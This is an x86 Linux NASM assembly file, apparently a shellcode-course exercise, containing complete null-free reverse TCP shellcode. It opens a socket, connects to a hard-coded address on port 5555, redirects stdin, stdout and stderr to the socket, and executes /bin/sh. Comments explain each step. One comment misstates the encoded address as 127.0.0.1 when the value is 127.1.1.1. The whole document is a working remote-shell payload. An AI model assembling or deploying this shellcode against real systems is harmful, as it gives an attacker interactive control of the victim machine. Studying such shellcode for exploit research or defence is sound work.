; Filename: shell_reverse_tcp.nasm
; Purpose: creating a reverse tcp shellcode

section .text

global  _start

_start:

	xor eax, eax	; clear eax
	xor ebx, ebx	; clear ebx
	xor edx, edx	; clear edx

; int socketcall (int call, unsigned long *args)
; sockfd = socket(int socket_family, int socket_type, int protocol)
; sockfd = socket(2,1,0)


	push eax	; third arg to socket (protocol): 0
	push byte 0x1	; second arg to socket (socket_type): 1
	push byte 0x2	; first arg to socket (socket_family): 2

; int socketcall(int call, unsigned long *args);

	mov ecx, esp	; set add of array as 2nd arg to socketcall
	inc bl  	; set first arg of socketcall to #1 (SYS_SOCKET)

	mov al, 102	; 102= sys_socketcall: call socketcall #1: SYS_SOCKET 
			; using al instead of eax avoids nulls(0x00)	

	int 0x80 	; jump into kernel mode , execute the sys_socketcall-> socket

	mov esi, eax	; store the return value (eax) into sockfd (esi)
 
; ----------------------------------------------

; eax = fd , ebx = 1 , esi = fd r
; int socketcall(int call, unsigned long *args)
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; connect(sockfd, &sockaddr, 16)

; prepare struct_sockaddr for bind: 

	push dword 0x0101017F	 ; sin_addr: 127.0.0.1
	push word 0xB315 	 ; sin_port: 5555 
	
	inc bl		; ebx =2
	push bx		; sin_family: 0x2
		
	mov ecx, esp	; save addr struct to ecx

; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	push byte 16	; addrlen: length of struct_sockaddr = 16
	push ecx	; pointer to struct_sockaddr
	push esi	; file descriptor's socket of previous call (fd)

; int socketcall(int call, unsigned long *args)

	mov ecx, esp	; set add of array as 2nd arg to socketcall
	inc bl		; set first arg of socketcall to #3 (SYS_CONNECT)

	mov al, 102	; 102= sys_socketcall: call socketcall #3: SYS_CONNECT 
			; using al instead of eax avoids nulls(0x00)	
	
	int 0x80 	; jump into kernel mode , execute sys_socketcall-> connect
	
; ----------------------------------------------

; int dup2(int oldfd, int newfd)
; dup2(sockfd, 0)

	
; use loop to create three filedescriptors STDIN=0, STDOUT=1, STDERR=2

	mov ebx, esi	; copied sockfd file descriptor to ebx
	xor ecx, ecx	; clear ecx
	mov cl, 2	; initilize counter ecx to 2 

loop:
	mov al, 0x3f 	; Set eax to 63 (syscall number for dup2)
	int 0x80 	; jump into kernel mode , execute syscall dup2

	dec ecx		; Decrement ecx (newfd)
	jns loop	; jump to loop until ecx is less than 0

; ----------------------------------------------	

; int execve(const char *filename, char *const argv[], char *const envp[])
; filename = /bin/sh
; argv = arguments  (address if /bin/sh == filename)
; envp << can be null

	push edx	; push 0 on stack (null terminator)
		
; push //bin/sh (8 bytes)

	push 0x68732f2f		; hs//
	push 0x6e69622f		; nib/

	mov ebx, esp
	push edx	
	push ebx	
	mov ecx, esp

	mov al, 0x0b	; Set eax to 11 (syscall number for execve)
	int 0x80 	; jump into kernel mode , execute syscall execve

